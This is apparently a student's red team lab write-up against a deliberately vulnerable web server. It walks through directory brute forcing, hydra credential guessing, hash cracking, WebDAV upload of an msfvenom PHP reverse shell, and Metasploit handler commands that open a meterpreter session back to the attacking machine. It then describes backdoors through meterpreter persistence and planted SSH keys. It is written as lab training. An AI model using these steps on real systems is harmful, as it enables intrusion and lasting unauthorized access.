## Red Team vs. Blue Team: Red Team Operations Summary

There are several steps involved with penetrating a network: Planning and Reconnaissance, Scanning, Exploitation, Post Exploitation, and Reporting. Once the network has been exploited there are a number of ways an attacker can abuse a system including stealing sensitive data, modifying data on the network, compromising the availability of data for a ransom and leaving a backdoor for perpetual access. In this lab we employ these methods to test the security of a network.

![RedTeam_NetworkDiagram](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/network_topology.JPG)

This document contains the following details:
- Description of the Topology
- Vulnerability Assessment
- Recon
- Exploitation
- Post-Exploitation

### Description of Topology

In this lab, there were several machines on the network to be tested. A Windows VM which contained Hyper-V Manager served as the gateway to other nested VMs on the same network. A machine called Capstone served as a vulnerable Web server. Another VM on the network was an ELK server which is used to capture log data from the Capstone Machine. This data is then presented using the Kibana platform. This platform is useful for parsing logs, creating visual representations of data, and creating alerts. Lastly, for this engagement the actual attacking machine - Kali - was on the network itself as well. The Capstone VM is the proposed target for this engagement. The goal of infiltrating the Capstone machine was to set up a reverse shell in which the Kali attack machine could remotely access the system. The sole target that was infiltrated was the Capstone VM.

The configuration details of each machine may be found below.

| Hostname | Function       | IP Address               | Operating System |
|----------|----------------|--------------------------|------------------|
| Gateway  | Gateway        | 192.168.1.1              | Windows 10 Pro   |
| Kali     | Attack Machine | 192.168.1.90             | Linux            |
| ELK      | ELK Log Server | 192.168.1.100            | Linux            |
| CAPSTONE | Target Machine | 192.168.1.105            | Linux            |

### Vulnerability Assessment

The assessment uncovered the following critical vulnerabiliies in the target:

- Public Facing Sensitive Data: Files alluding to the existence of a secret folder within the web server
  - Impact: Gives attackers incentive to probe for more sensitive data
- Brute Force Attack and Hash cracking: Attackers can use programs to guess login credentials or decrypt password hashes to gain credentials
  - Impact: Discovered credentials can be used to potentially access sensitive data on the web server
- Web Misconfiguration: Security Controls are not in place to restrict who can upload files to the web server
  - Impact: Attackers can upload and plant malware to later be used on the server
- Local File Inclusion (LFI): Attackers can execute the planted malware file to potentially gain a reverse shell on the web server
  - Impact: Discovered credentials can be used to potentially access sensitive data on the web server       

### Recon

- Vulnerabilities were identified in the target by first site mapping the web server using a simple Firefox Browser and a Kali Linux tool called dirbuster. 
- Dirbuster is a java application designed to brute force directories on web applications and web servers. Performing this recon revealed an important URL on the server:"/webdav".

![dirbScan](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/dirbScan.JPG)

- Further "site-walking" was conducted by browsing directories in the web browser manually. 
- Through a public-facing sensitive data vulnerability, it was discovered that a secret directory hidden within the web server existed and was only accessible by employees.

![secretFolder](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/secretFolder.JPG)

### Exploitation

- After gathering useful information through recon, the findings prompted the idea of brute forcing employee credentials using the employees listed in the site’s “Meet Our Team” page. 
- The intention was to find credentials to access this secret folder. 
- This brute force attack was successfully executed using the Kali Linux tool “hydra” to obtain the credentials of employee Ashton.

![hydra](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/hydra.JPG)

- The discovered credentials were then used to log into the secret folder directory

![secretFolderLogin](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/SecretFolderLogin.JPG) 

- The contents of the secret folder revealed a file called "connect_to_corp_server"

![secretFolder_Dir](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/SecretFolderDirContents.JPG) . 

- The next exploit was discovered in a file within the secret folder called "connect_to_corp_server". 
- This file contained the hash of the CEO’s (Ryan) password and instructions on how to access another hidden directory within the server called “webdav”. 
- The contents are displayed below: 
  - Note the network file share address is incorrect here. It should include the IP of our victim machine i.e. dav://192.168.1.105/webdav/  

![webDavInstructions](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/webDavInstructions.JPG) 

- Ryan's hashed password was copied and input into an online tool called Crack Station. 
- The site uses rainbow tables to compare the input hash to precomputed hashes to "crack" the password. 
- This hash was successfully cracked and privileges were escalated further to the CEO's account. 

![crackstation](![CrackStationPassword](https://user-images.githubusercontent.com/94092268/185767062-adf60e79-6909-4b18-ab6b-170e1abd8066.JPG) 

- A login screen was prompted for credentials

![webDavLogin](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/webDavLogin.JPG) 

- Next, a payload was constructed using msfvenom to create the reverse shell php script to be exploited on the target. 

![msfvenomPayload](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/9476b6aff2c7a0769672dc18c197a3981b2956c3/RedTeam_Images/msfvenomPayload.JPG) 

- With the high-level access acquired from Ryan's credentials, a php script was uploaded to the web server to initiate the first step in establishing a reverse shell between the Capstone Server and the Kali attacking machine. 
- This is exploitation of the web misconfiguration

> - Click Folder at top of desktop, Click in search bar and type in network file share folder
> - dav://192.168.1.105/webdav/ , then enter ryan's credentials
> - Drag and drop reverse_shell.php file into network file share 

- The ability to upload a .php script is a web misconfiguration vulnerability that was exploited. 
- A general coding best practice is to never allow uploading to a web server unless that is apart of the web application's functionality to the client. 
- If uploading is necessary, uploaded data should undergo scrutiny before being allowed on the web server to ensure the data does not contain malware. 

![uploadShellScript](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/9476b6aff2c7a0769672dc18c197a3981b2956c3/RedTeam_Images/UploadShellScript.jpg)

- Finally, a Local File Inclusion (LFI) vulnerability in the web server ensured the success of the reverse shell exploit. 
- Local File Inclusion vulnerabilities work by allowing an uploaded file or script to be executed on the server. 
- In this case, once the code is executed, it sends a meterpreter shell directly back to the attacking machine. 
- This was accomplished using Metasploit to turn on a listening port waiting for us to execute the newly uploaded php script on the target machine
> - msfconsole
> - use exploit/multi/handler
> - set payload php/meterpreter/reverse_tcp
> - set lhost 192.168.1.90
> - set lport 80
> - show options
> - exploit

- This code forces the target machine to send us a meterpreter shell connection. 

![msfsetup](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/9476b6aff2c7a0769672dc18c197a3981b2956c3/RedTeam_Images/msfsetup.JPG)

- Now we execute the script on the victim machine by typing the file path in the folder explorer search bar
> - dav://192.168.1.105/webdav/reverse_shell.php 

![meterpreterShell](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/meterpreterShell.JPG) 

- Once inside, a more stable shell was first established using the command “shell” in the Meterpreter session. 
- Basic linux commands like “cd” and “find” were utilized to search for files containing the word “flag” in the title.

![flagComplete](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/flagComplete.JPG)

### Post Exploitation

There are several ways to reconnect to the target. First, if no backdoor has been established, an attacker would have to exploit the target again using the same steps as before - this is why it is imperative to document every step of the engagement in the event you must recreate a scenario. Creating backdoors is another way to reconnect to a target after being disconnected. This can be accomplished through many methods and it differs based on the OS of the target machine. 

In the case of the Meterpreter session, meterpreter has a script called “persistence.rb” to maintain an open backdoor even if the target system is rebooted. In the meterpreter command line prompt run the command “ run persistence -h”. It is important to note that this method requires no authentication so anyone with access to the port used for the exploit can access the machine. This is not ideal for the purposes of penetration testing unless it is done on a network that is not public-facing. 

Another technique to create a backdoor once inside of the Capstone VM is to use SSH keys; note this service was shown to be running on Port 22 in the nmap service scan so it can be used, however this would not work where this service is not enabled. Simply add your public SSH key into the “~/.ssh/authorized_keys” file to allow for remotely connecting via SSH. 
